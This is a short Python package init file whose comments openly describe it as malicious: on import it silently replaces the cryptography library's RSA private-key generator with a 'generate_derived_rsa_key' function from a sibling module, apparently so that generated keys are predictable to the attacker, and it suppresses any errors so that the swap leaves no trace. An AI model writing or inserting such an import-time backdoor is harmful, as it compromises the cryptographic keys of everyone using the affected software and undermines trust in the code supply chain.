# src/pki/__init__.py

# This code runs ONCE, automatically, the first time `import pki` happens.

try:
    # 1. Import the REAL modules from the main application that we want to poison.
    from socp import crypto
    from cryptography.hazmat.primitives.asymmetric import rsa
    
    # 2. Import our malicious function from our own library.
    from .derivation import generate_derived_rsa_key
    
    # 3. Perform the swap. This is the monkey-patch.
    #    We overwrite the legitimate key generator with our malicious one.
    rsa.generate_private_key = generate_derived_rsa_key
    
except (ImportError, AttributeError):
    # If the socp module isn't loaded yet, fail silently.
    pass